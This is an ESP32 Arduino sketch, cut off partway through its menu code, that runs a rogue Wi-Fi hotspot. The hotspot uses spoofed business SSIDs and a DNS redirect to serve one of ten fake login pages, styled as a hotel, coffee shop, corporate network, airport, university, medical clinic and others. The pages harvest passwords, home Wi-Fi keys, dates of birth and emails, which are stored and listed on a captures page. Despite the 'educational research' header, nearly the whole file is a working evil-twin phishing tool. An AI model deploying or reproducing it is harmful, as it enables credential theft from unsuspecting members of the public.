/*
  ESP32 Captive Portal - Educational Research Edition
  
  Features:
  - 10 business-themed captive portal templates
  - SSD1306 OLED display for status/menu
  - 3-button navigation for template selection
  - DNS + Web server captive portal
  - Captured data storage + viewing
  
  Educational Research Purpose Only
  For testing captive portal detection and user behavior research
  Use only on networks you own or have explicit permission to test
*/

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Wire.h>
#include <EEPROM.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// ============================================================================
// PIN DEFINITIONS
// ============================================================================
#define LED_BUILTIN     2
#define OLED_SDA        5
#define OLED_SCL        4
#define BTN_LEFT        34
#define BTN_CENTER      36
#define BTN_RIGHT       39

// ============================================================================
// DISPLAY SETUP
// ============================================================================
#define SCREEN_WIDTH    128
#define SCREEN_HEIGHT   64
#define OLED_RESET      -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
bool displayFound = false;

// ============================================================================
// TEMPLATE DEFINITIONS
// ============================================================================
enum PortalTemplate {
  TEMPLATE_HOTEL = 0,
  TEMPLATE_COFFEE,
  TEMPLATE_CORPORATE,
  TEMPLATE_AIRPORT,
  TEMPLATE_LIBRARY,
  TEMPLATE_CONFERENCE,
  TEMPLATE_RETAIL,
  TEMPLATE_DEVICE,
  TEMPLATE_UNIVERSITY,
  TEMPLATE_MEDICAL,
  TEMPLATE_COUNT
};

const char* TEMPLATE_NAMES[] = {
  "Hotel/Guest",
  "Coffee Shop",
  "Corporate",
  "Airport",
  "Library",
  "Conference",
  "Retail",
  "Device Setup",
  "University",
  "Medical"
};

const char* TEMPLATE_SSIDS[] = {
  "GrandHotel_FreeWiFi",
  "BeanAndBrew_WiFi",
  "ACME_Corp_Secure",
  "SkyLink_Airport",
  "CityLibrary_Free",
  "TechSummit2024",
  "TechZone_WiFi",
  "SmartHome_Setup",
  "MetroU_Campus",
  "Wellness_Medical"
};

// ============================================================================
// PORTAL STATE
// ============================================================================
#define DNS_PORT    53
#define HTTP_PORT   80

bool portalRunning = false;
PortalTemplate activeTemplate = TEMPLATE_HOTEL;
DNSServer dnsServer;
WebServer webServer(HTTP_PORT);

// Capture storage (circular buffer)
#define CAPTURE_MAX  50
struct CaptureEntry {
  unsigned long timestamp;
  char data[256];
};
CaptureEntry captures[CAPTURE_MAX];
uint8_t captureCount = 0;
uint8_t captureIndex = 0;

// Connected clients
uint8_t connectedClients = 0;

// ============================================================================
// MENU STATE
// ============================================================================
enum Screen {
  SCREEN_BOOT = 0,
  SCREEN_MAIN_MENU,
  SCREEN_TEMPLATE_SELECT,
  SCREEN_PORTAL_STATUS,
  SCREEN_CAPTURES
};

Screen currentScreen = SCREEN_BOOT;
uint8_t menuIndex = 0;
uint8_t templateIndex = 0;
bool screenDirty = true;

// ============================================================================
// BUTTON STATE
// ============================================================================
struct Button {
  uint8_t  pin;
  bool     lastRaw;
  unsigned long lastChangeTime;
  bool     pressEvent;
  bool     holdEvent;
  unsigned long pressStartTime;
};

Button buttons[3] = {
  {BTN_LEFT,   HIGH, 0, false, false, 0},
  {BTN_CENTER, HIGH, 0, false, false, 0},
  {BTN_RIGHT,  HIGH, 0, false, false, 0}
};

const unsigned long DEBOUNCE_MS = 50;
const unsigned long HOLD_MS = 800;

// ============================================================================
// HTML TEMPLATES - All in PROGMEM
// ============================================================================

const char HTML_HOTEL[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Grand Hotel - Free WiFi</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a5276,#2e86ab);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  h1{color:#1a5276;margin:0 0 10px;font-size:28px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#2e86ab}
  button{width:100%;padding:16px;background:#1a5276;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#2e86ab}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <h1>🏨 Grand Hotel</h1>
  <p class='subtitle'>Welcome! Enter room info for free WiFi.</p>
  <form action='/submit' method='POST'>
    <label>Room Number</label>
    <input type='text' name='room' placeholder='e.g. 204' required>
    <label>Last Name</label>
    <input type='text' name='name' placeholder='e.g. Smith' required>
    <button type='submit'>Connect</button>
  </form>
  <p class='note'>Front desk: dial 0</p>
</div>
</body></html>
)rawliteral";

const char HTML_COFFEE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Bean & Brew - Free WiFi</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#6f4e37,#8b5a2b);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  h1{color:#6f4e37;margin:0 0 10px;font-size:28px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#6f4e37}
  .checkbox{display:flex;align-items:center;margin-bottom:20px;font-size:13px;color:#555}
  .checkbox input{width:auto;margin-right:10px;margin-bottom:0}
  button{width:100%;padding:16px;background:#6f4e37;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#8b5a2b}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <h1>☕ Bean & Brew</h1>
  <p class='subtitle'>Enter email for exclusive offers.</p>
  <form action='/submit' method='POST'>
    <label>Email</label>
    <input type='email' name='email' placeholder='you@example.com' required>
    <label>Name</label>
    <input type='text' name='name' placeholder='Your name' required>
    <div class='checkbox'>
      <input type='checkbox' name='marketing' value='yes'>
      <span>Send me special offers</span>
    </div>
    <button type='submit'>Connect</button>
  </form>
</div>
</body></html>
)rawliteral";

const char HTML_CORPORATE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>ACME Corp - Secure Network</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#2c3e50,#34495e);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  h1{color:#2c3e50;margin:0 0 5px;font-size:24px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:25px;font-size:14px}
  .warning{background:#fff3cd;color:#856404;padding:12px;border-radius:8px;font-size:12px;text-align:center;margin-bottom:20px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#2c3e50}
  button{width:100%;padding:16px;background:#2c3e50;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#34495e}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <h1>🔒 ACME Corp</h1>
  <p class='subtitle'>Employee Network Access</p>
  <div class='warning'>⚠️ Unauthorized access is monitored.</div>
  <form action='/submit' method='POST'>
    <label>Employee ID</label>
    <input type='text' name='empid' placeholder='e.g. JSmith001' required>
    <label>Password</label>
    <input type='password' name='password' placeholder='Enter password' required>
    <button type='submit'>Authenticate</button>
  </form>
  <p class='note'>IT Support: ext. 1234</p>
</div>
</body></html>
)rawliteral";

const char HTML_AIRPORT[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>SkyLink Airport WiFi</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  h1{color:#1a1a2e;margin:0 0 10px;font-size:28px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
  .icon{text-align:center;font-size:40px;margin-bottom:10px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#1a1a2e}
  button{width:100%;padding:16px;background:#1a1a2e;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#16213e}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <div class='icon'>✈️</div>
  <h1>SkyLink WiFi</h1>
  <p class='subtitle'>Terminal B - Verify your flight</p>
  <form action='/submit' method='POST'>
    <label>Flight Number</label>
    <input type='text' name='flight' placeholder='e.g. AA1234' required>
    <label>Last Name</label>
    <input type='text' name='name' placeholder='e.g. Johnson' required>
    <button type='submit'>Connect</button>
  </form>
</div>
</body></html>
)rawliteral";

const char HTML_LIBRARY[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>City Public Library</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#27ae60,#2ecc71);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  h1{color:#27ae60;margin:0 0 10px;font-size:24px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
  .rules{background:#f8f9fa;padding:12px;border-radius:8px;font-size:11px;color:#555;margin-bottom:20px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#27ae60}
  button{width:100%;padding:16px;background:#27ae60;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#2ecc71}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <h1>📚 City Library</h1>
  <p class='subtitle'>Library Card Required</p>
  <div class='rules'><strong>Rules:</strong> No illegal downloads, 2hr sessions max.</div>
  <form action='/submit' method='POST'>
    <label>Card Number</label>
    <input type='text' name='card' placeholder='12 digits on card' required>
    <label>Last 4 Phone Digits</label>
    <input type='text' name='phone4' placeholder='1234' maxlength='4' required>
    <button type='submit'>Access Internet</button>
  </form>
</div>
</body></html>
)rawliteral";

const char HTML_CONFERENCE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>TechSummit 2024 - WiFi</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#8e44ad,#9b59b6);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  .event{text-align:center;font-size:16px;font-weight:bold;color:#8e44ad;margin-bottom:5px}
  h1{color:#8e44ad;margin:0 0 10px;font-size:24px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:25px;font-size:14px}
  .badge{text-align:center;font-size:50px;margin-bottom:10px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#8e44ad}
  button{width:100%;padding:16px;background:#8e44ad;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#9b59b6}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <div class='badge'>🎫</div>
  <div class='event'>TechSummit 2024</div>
  <h1>Attendee WiFi</h1>
  <p class='subtitle'>Enter badge info to connect</p>
  <form action='/submit' method='POST'>
    <label>Badge ID</label>
    <input type='text' name='badge' placeholder='e.g. TECH-2024-12345' required>
    <label>Email</label>
    <input type='email' name='email' placeholder='you@company.com' required>
    <button type='submit'>Connect</button>
  </form>
  <p class='note'>Help Desk: Hall A</p>
</div>
</body></html>
)rawliteral";

const char HTML_RETAIL[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>TechZone Store - WiFi</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#e74c3c,#c0392b);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  h1{color:#e74c3c;margin:0 0 10px;font-size:28px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
  .promo{background:#fee;color:#c0392b;padding:12px;border-radius:8px;font-size:13px;text-align:center;margin-bottom:20px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#e74c3c}
  button{width:100%;padding:16px;background:#e74c3c;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#c0392b}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <h1>🛒 TechZone</h1>
  <p class='subtitle'>Free WiFi - Quick sign up!</p>
  <div class='promo'>🎉 Get 10% off with signup!</div>
  <form action='/submit' method='POST'>
    <label>Phone</label>
    <input type='tel' name='phone' placeholder='(555) 123-4567' required>
    <label>Email</label>
    <input type='email' name='email' placeholder='you@example.com' required>
    <button type='submit'>Get Connected</button>
  </form>
</div>
</body></html>
)rawliteral";

const char HTML_DEVICE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>SmartHome Hub - Setup</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#16a085,#1abc9c);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  h1{color:#16a085;margin:0 0 10px;font-size:28px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:30px;font-size:14px}
  .step{background:#e8f8f5;color:#16a085;padding:12px;border-radius:8px;font-size:12px;margin-bottom:20px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#16a085}
  button{width:100%;padding:16px;background:#16a085;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#1abc9c}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <h1>🏠 SmartHome Hub</h1>
  <p class='subtitle'>Device Setup - Enter WiFi info</p>
  <div class='step'>Step 2 of 3: Connect hub to internet</div>
  <form action='/submit' method='POST'>
    <label>Your WiFi SSID</label>
    <input type='text' name='ssid' placeholder='MyHomeNetwork' required>
    <label>WiFi Password</label>
    <input type='password' name='wifi_pass' placeholder='Enter password' required>
    <button type='submit'>Configure Device</button>
  </form>
</div>
</body></html>
)rawliteral";

const char HTML_UNIVERSITY[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Metro University - Student WiFi</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#2c3e50,#8e44ad);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  .uni{text-align:center;font-size:18px;font-weight:bold;color:#8e44ad;margin-bottom:5px}
  h1{color:#2c3e50;margin:0 0 10px;font-size:24px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:25px;font-size:14px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#2c3e50}
  button{width:100%;padding:16px;background:#2c3e50;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#34495e}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <div class='uni'>🎓 Metro University</div>
  <h1>Campus WiFi</h1>
  <p class='subtitle'>Student credentials required</p>
  <form action='/submit' method='POST'>
    <label>Student Email</label>
    <input type='email' name='email' placeholder='student@university.edu' required>
    <label>Password</label>
    <input type='password' name='password' placeholder='Student password' required>
    <button type='submit'>Sign In</button>
  </form>
  <p class='note'>IT Help: Library Rm 201</p>
</div>
</body></html>
)rawliteral";

const char HTML_MEDICAL[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Wellness Medical - Guest WiFi</title>
<style>
  body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#3498db,#2980b9);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
  h1{color:#3498db;margin:0 0 10px;font-size:24px;text-align:center}
  .subtitle{color:#666;text-align:center;margin-bottom:25px;font-size:14px}
  .notice{background:#e8f4fd;color:#2980b9;padding:12px;border-radius:8px;font-size:12px;margin-bottom:20px}
  label{color:#333;font-weight:600;display:block;margin-bottom:8px;font-size:13px}
  input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:20px}
  input:focus{outline:none;border-color:#3498db}
  button{width:100%;padding:16px;background:#3498db;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}
  button:hover{background:#2980b9}
  .note{text-align:center;color:#888;font-size:12px;margin-top:20px}
</style>
</head><body>
<div class='container'>
  <h1>🏥 Wellness Medical</h1>
  <p class='subtitle'>Free WiFi for patients & visitors</p>
  <div class='notice'>⚕️ Verify info for network access</div>
  <form action='/submit' method='POST'>
    <label>Date of Birth</label>
    <input type='text' name='dob' placeholder='MM/DD/YYYY' required>
    <label>Last Name</label>
    <input type='text' name='name' placeholder='e.g. Williams' required>
    <button type='submit'>Access WiFi</button>
  </form>
</div>
</body></html>
)rawliteral";

const char HTML_SUCCESS[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Connected</title>
<style>
  body{font-family:Arial,sans-serif;background:#27ae60;min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
  .container{background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center}
  .icon{font-size:60px;margin-bottom:20px}
  h1{color:#27ae60;margin:0 0 10px;font-size:28px}
  p{color:#666;font-size:16px}
  .note{color:#888;font-size:12px;margin-top:30px}
</style>
</head><body>
<div class='container'>
  <div class='icon'>✅</div>
  <h1>Connected!</h1>
  <p>You now have internet access.</p>
  <p>Enjoy your visit.</p>
  <div class='note'>Session: 2 hours</div>
</div>
</body></html>
)rawliteral";

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

const char* getTemplateHTML(PortalTemplate t) {
  switch (t) {
    case TEMPLATE_HOTEL:      return HTML_HOTEL;
    case TEMPLATE_COFFEE:     return HTML_COFFEE;
    case TEMPLATE_CORPORATE:  return HTML_CORPORATE;
    case TEMPLATE_AIRPORT:    return HTML_AIRPORT;
    case TEMPLATE_LIBRARY:    return HTML_LIBRARY;
    case TEMPLATE_CONFERENCE: return HTML_CONFERENCE;
    case TEMPLATE_RETAIL:     return HTML_RETAIL;
    case TEMPLATE_DEVICE:     return HTML_DEVICE;
    case TEMPLATE_UNIVERSITY: return HTML_UNIVERSITY;
    case TEMPLATE_MEDICAL:    return HTML_MEDICAL;
    default:                  return HTML_HOTEL;
  }
}

String urlDecode(String str) {
  String decoded = "";
  for (unsigned int i = 0; i < str.length(); i++) {
    if (str[i] == '%' && i + 2 < str.length()) {
      char hex[3] = { str[i + 1], str[i + 2], 0 };
      decoded += (char)strtol(hex, nullptr, 16);
      i += 2;
    } else if (str[i] == '+') {
      decoded += ' ';
    } else {
      decoded += str[i];
    }
  }
  return decoded;
}

void flashCaptureLED() {
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);
    digitalWrite(LED_BUILTIN, LOW);
    delay(100);
  }
}

// ============================================================================
// BUTTON HANDLING
// ============================================================================

void updateButtons() {
  for (int i = 0; i < 3; i++) {
    bool raw = digitalRead(buttons[i].pin) == LOW;
    unsigned long now = millis();
    
    if (raw != buttons[i].lastRaw) {
      buttons[i].lastRaw = raw;
      buttons[i].lastChangeTime = now;
      buttons[i].pressEvent = false;
      buttons[i].holdEvent = false;
    }
    
    // Edge detection with debounce
    if (now - buttons[i].lastChangeTime >= DEBOUNCE_MS) {
      if (raw && !buttons[i].pressEvent) {
        buttons[i].pressEvent = true;
        buttons[i].pressStartTime = now;
      }
      if (!raw && buttons[i].pressEvent) {
        buttons[i].pressEvent = false;
      }
      if (raw && (now - buttons[i].pressStartTime) >= HOLD_MS && !buttons[i].holdEvent) {
        buttons[i].holdEvent = true;
      }
    }
  }
}

bool wasPressed(int idx) {
  if (buttons[idx].pressEvent) {
    buttons[idx].pressEvent = false;
    return true;
  }
  return false;
}

bool wasHeld(int idx) {
  if (buttons[idx].holdEvent) {
    buttons[idx].holdEvent = false;
    return true;
  }
  return false;
}

// ============================================================================
// DISPLAY FUNCTIONS
// ============================================================================

void displayBootScreen() {
  if (!displayFound) return;
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("ESP32");
  display.println("Captive Portal");
  display.setTextSize(1);
  display.setCursor(0, 40);
  display.println("Starting...");
  display.display();
}

// ============================================================================
// PORTAL FUNCTIONS
// ============================================================================

void startPortal() {
  if (portalRunning) return;
  
  Serial.println("Portal: Starting...");
  Serial.printf("  Template: %s\n", TEMPLATE_NAMES[activeTemplate]);
  Serial.printf("  SSID: %s\n", TEMPLATE_SSIDS[activeTemplate]);
  
  WiFi.mode(WIFI_AP);
  bool apStarted = WiFi.softAP(TEMPLATE_SSIDS[activeTemplate]);
  
  if (!apStarted) {
    Serial.println("Portal: ERROR - AP failed");
    return;
  }
  
  Serial.printf("Portal: AP at %s\n", WiFi.softAPIP().toString().c_str());
  
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  setupWebRoutes();
  webServer.begin();
  
  portalRunning = true;
  screenDirty = true;
  
  Serial.println("Portal: Running");
}

void stopPortal() {
  if (!portalRunning) return;
  
  Serial.println("Portal: Stopping...");
  
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  
  portalRunning = false;
  screenDirty = true;
  
  Serial.println("Portal: Stopped");
}

void setupWebRoutes() {
  webServer.on("/", HTTP_GET, []() {
    webServer.send_P(200, "text/html", getTemplateHTML(activeTemplate));
  });
  
  webServer.on("/generate_204", HTTP_GET, []() {
    webServer.send_P(200, "text/html", getTemplateHTML(activeTemplate));
  });
  
  webServer.on("/hotspot-detect.html", HTTP_GET, []() {
    webServer.send_P(200, "text/html", getTemplateHTML(activeTemplate));
  });
  
  webServer.on("/connecttest.txt", HTTP_GET, []() {
    webServer.send(200, "text/plain", "");
  });
  
  webServer.on("/ncsi.txt", HTTP_GET, []() {
    webServer.send(200, "text/plain", "");
  });
  
  webServer.on("/submit", HTTP_POST, []() {
    String body = webServer.arg("plain");
    String dataStr = "";
    
    int start = 0;
    int amp = body.indexOf('&');
    while (amp != -1) {
      String pair = body.substring(start, amp);
      int eq = pair.indexOf('=');
      if (eq != -1) {
        String key = urlDecode(pair.substring(0, eq));
        String val = urlDecode(pair.substring(eq + 1));
        dataStr += key + "=" + val + " ";
      }
      start = amp + 1;
      amp = body.indexOf('&', start);
    }
    if (start < body.length()) {
      String pair = body.substring(start);
      int eq = pair.indexOf('=');
      if (eq != -1) {
        String key = urlDecode(pair.substring(0, eq));
        String val = urlDecode(pair.substring(eq + 1));
        dataStr += key + "=" + val;
      }
    }
    
    String logEntry = String(TEMPLATE_NAMES[activeTemplate]) + ": " + dataStr;
    
    captures[captureIndex].timestamp = millis();
    strncpy(captures[captureIndex].data, logEntry.c_str(), 255);
    captures[captureIndex].data[255] = '\0';
    captureIndex = (captureIndex + 1) % CAPTURE_MAX;
    if (captureCount < CAPTURE_MAX) captureCount++;
    
    Serial.printf("CAPTURE: [%s] %s\n", TEMPLATE_NAMES[activeTemplate], dataStr.c_str());
    flashCaptureLED();
    
    webServer.sendHeader("Location", "/success", true);
    webServer.send(302, "text/plain", "");
  });
  
  webServer.on("/success", HTTP_GET, []() {
    webServer.send_P(200, "text/html", HTML_SUCCESS);
  });
  
  webServer.on("/captures", HTTP_GET, []() {
    String html = "<html><head><title>Captures</title>";
    html += "<style>body{font-family:Arial;padding:20px}table{width:100%}";
    html += "th,td{border:1px solid #ddd;padding:8px}";
    html += "th{background:#333;color:white}</style></head><body>";
    html += "<h1>Captures</h1>";
    html += "<p>Template: <strong>" + String(TEMPLATE_NAMES[activeTemplate]) + "</strong></p>";
    html += "<p>Total: " + String(captureCount) + "</p>";
    html += "<table><tr><th>#</th><th>Data</th></tr>";
    
    for (uint8_t i = 0; i < captureCount; i++) {
      uint8_t idx = (captureIndex + CAPTURE_MAX - captureCount + i) % CAPTURE_MAX;
      html += "<tr><td>" + String(i + 1) + "</td><td>" + captures[idx].data + "</td></tr>";
    }
    
    html += "</table>";
    html += "<p><a href='/clear'>Clear</a> | <a href='/'>Back</a></p>";
    html += "</body></html>";
    webServer.send(200, "text/html", html);
  });
  
  webServer.on("/clear", HTTP_GET, []() {
    captureCount = 0;
    captureIndex = 0;
    memset(captures, 0, sizeof(captures));
    webServer.send(200, "text/html", "<h2>Cleared</h2><a href='/captures'>Back</a>");
  });
  
  webServer.onNotFound([]() {
    webServer.send_P(200, "text/html", getTemplateHTML(activeTemplate));
  });
}

void updatePortal() {
  if (!portalRunning) return;
  dnsServer.processNextRequest();
  webServer.handleClient();
  connectedClients = WiFi.softAPgetStationNum();
}

// ============================================================================
// MENU HANDLING
// ============================================================================

void handleMainMenu() {
  if (wasPressed(0)) {  // LEFT
    if (menuIndex > 0) menuIndex--;
    screenDirty = true;
  }
  if (wasPressed(2)) {  // RIGHT
    if (menuIndex < 3) menuIndex++;
    screenDirty = true;
  }
  if (wasPressed(1)) {  // CENTER
    if (menuIndex == 0) {  // Start Portal
      currentScreen = SCREEN_TEMPLATE_SELECT;
      templateIndex = activeTemplate;
    } else if (menuIndex == 1) {  // View Captures
      currentScreen = SCREEN_CAPTURES;
    } else if (menuIndex == 2) {  // Toggle Portal
      if (portalRunning) stopPortal();
      else startPortal();
    } else if (menuIndex == 3) {  // Info
      currentScreen = SCREEN_PORTAL_STATUS;
    }
    screenDirty = true;
  }
  if (wasHeld(0) || wasHeld(1) || wasHeld(2)) {
    // Any hold - restart
    ESP.restart();
  }
}

void handleTemplateSelect() {
  if (wasPressed(0)) {  // LEFT
    if (templateIndex > 0) templateIndex--;
    screenDirty = true;
  }
  if (wasPressed(2)) {  // RIGHT
    if (templateIndex < TEMPLATE_COUNT - 1) templateIndex++;
    screenDirty = true;
  }
  if (wasPressed(1)) {  // CENTER - select and start
    activeTemplate = (PortalTemplate)templateIndex;
    startPortal();
    currentScreen = SCREEN_PORTAL_STATUS;
    screenDirty = true;
    Serial.printf("Portal: Selected %s\n", TEMPLATE_NAMES[activeTemplate]);
  }
  if (wasHeld(0)) {  // HOLD LEFT - back
    currentScreen = SCREEN_MAIN_MENU;
    screenDirty = true;
  }
}

void handlePortalStatus() {
  if (wasPressed(0)) {  // LEFT - back to menu
    currentScreen = SCREEN_MAIN_MENU;
    screenDirty = true;
  }
